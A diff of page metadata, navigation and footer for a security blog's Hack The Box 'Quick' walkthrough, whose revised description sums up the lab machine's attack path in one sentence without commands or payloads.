 25:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-pikaboo-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Pikaboo Walkthrough"}]]}]}],["$","$L4",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-ransom-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Ransom Walkthrough"}]]}]}]]}]
 26:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L4","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L4",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-29:T50d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/#article","headline":"Hack The Box: Quick Walkthrough","description":"An archived walkthrough of the retired Hack The Box Quick machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/","datePublished":"2026-06-11T12:03:27.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2512,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/92f7186f5c251e8b686633cee2d22e64f4fd7934/HTB-Quick.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-quick-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Quick Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"}]}]}27:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$29"}}]
+29:T567,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/#article","headline":"Hack The Box: Quick Walkthrough","description":"HTTP/3 documentation supplied a default password, a stored ESI payload wrote an SSH key for Sam, and a symlink race in the internal printer service pivoted to srvadm, whose saved printer credential was reused for root.","url":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/","datePublished":"2026-06-11T12:03:27.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2466,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/92f7186f5c251e8b686633cee2d22e64f4fd7934/HTB-Quick.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-quick-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Quick Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"}]}]}27:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$29"}}]
 1a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
 2a:I[6869,[],"IconMark"]
 17:null
-1c:[["$","title","0",{"children":"Hack The Box: Quick Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box Quick machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: Quick Walkthrough"}],["$","meta","13",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box Quick machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-quick-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box Quick machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T12:03:27.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: Quick Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box Quick machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-quick-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L2a","34",{}]]
+1c:[["$","title","0",{"children":"Hack The Box: Quick Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"An authorized-lab walkthrough of Hack The Box Quick, covering the attack path, validation steps, and practical lessons."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: Quick Walkthrough"}],["$","meta","13",{"property":"og:description","content":"An authorized-lab walkthrough of Hack The Box Quick, covering the attack path, validation steps, and practical lessons."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-quick-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-quick-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box Quick machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T12:03:27.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: Quick Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"An authorized-lab walkthrough of Hack The Box Quick, covering the attack path, validation steps, and practical lessons."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-quick-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L2a","34",{}]]
